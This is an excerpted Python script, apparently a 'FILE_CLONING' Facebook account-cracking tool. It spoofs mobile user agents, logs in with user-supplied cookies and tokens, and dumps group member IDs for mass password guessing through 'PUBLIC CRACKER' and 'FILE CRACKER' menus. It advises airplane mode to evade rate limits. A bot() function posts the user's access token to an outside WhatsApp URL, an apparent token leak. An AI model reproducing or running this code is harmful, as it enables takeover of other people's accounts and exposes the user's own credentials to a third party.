...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mYOU ENTER TO ASMAT KHAN TOOL \033[1;35m• \033[1;36m• \033[1;34m•')
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/ASMATKHAN1/FILE_CLONING/blob/main/ua.txt').text
		ua=open('.bbnew.txt','w')
...
\t\x1b[1;92m ##     ##  ######  ##     ## ##     ##    ##    
\x1b[1;97m -------------------------------------------------
\x1b[1;97m ASMAT KHAN
\x1b[1;97m GITHUB : https://github.com/ASMATKHAN1
\x1b[1;97m WHATS'APP : +923402135201
\x1b[1;97m--------------------------------------------------
\x1b[1;97m THIS IS PUBLIC TOOL
\x1b[1;97m--------------------------------------------------
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} login successful bro enjoy ok ids!!!!{x} ');time.sleep(1)
		print(f'  {x}[{h}•{x}]{h} BRO AGAIN RUN COMMANDS!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILD INPUT FRESH COOKIES?? !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://wa.me/+03402135201?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	gh = 'https://github.com/ASMATKHAN1'
	...
	print('')
	print("%s------------------------------------------%s"%(B,P))
	print(f'[{H}v{P}] [%s1%s] PUBLIC CRACKER   '%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}v{P}] [%s3%s] FILE CRACKER     '%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}v{P}] [%s0%s] Logout (%sCookie%s)'%(M,N,M,N));time.sleep(0.03)
	print("%s------------------------------------------%s"%(B,P))
	_____asmat__xd_____ = input('\n>> Choise : ')
	if _____asmat__xd_____ in ['1']:
		dump_massal()
	elif _____asmat__xd_____ in ['2']:
		dump_massal()
	elif _____asmat__xd_____ in ['3']:
		crack_file()
	elif _____asmat__xd_____ in ['4']:
		menu()
	elif _____asmat__xd_____ in ['5']:
		result()
	elif _____asmat__xd_____ in ['0']:
...
def grup():
	...
	if berr2=='Masuk Facebook':
		...
		asmat_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
...
def passwrd():
	os.system('clear')
	banner()
	print(f'>>>>> {m}•{k}•{h}•{x} USE AIRPLANE MODE FOR SPEED UP{m}•{k}•{h}•{x} <<<<< ')
	print (47*'-')
	print('')
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/asmat-DUMP')
	except:pass
